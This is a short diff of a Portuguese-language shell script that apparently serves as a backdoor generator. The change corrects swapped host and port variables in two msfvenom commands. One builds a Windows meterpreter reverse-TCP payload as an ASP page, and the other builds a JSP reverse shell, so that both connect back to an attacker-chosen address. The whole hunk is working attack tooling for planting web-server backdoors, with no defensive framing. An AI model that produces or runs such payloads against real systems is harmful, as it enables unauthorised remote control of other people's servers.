@@ -79,12 +79,12 @@ elif [ $escolha == 3 ]
 
 elif [ $escolha == 4 ]
 	then
-		echo "Criando Backdoor...."; msfvenom -p windows/meterpreter/reverse_tcp LHOST=$port LPORT=$ip -f asp > $diretorio/$nome.asp
+		echo "Criando Backdoor...."; msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $diretorio/$nome.asp
 		payload="windows/meterpreter/reverse_tcp"
 
 elif [ $escolha == 5 ] 
 	then
-		echo "Criando Backdoor...."; msfvenom -p java/jsp_shell_reverse_tcp LHOST=$port LPORT=$ip -f raw > $diretorio/$nome.jsp
+		echo "Criando Backdoor...."; msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $diretorio/$nome.jsp
 		payload="java/jsp_shell_reverse_tcp"
 fi
 		
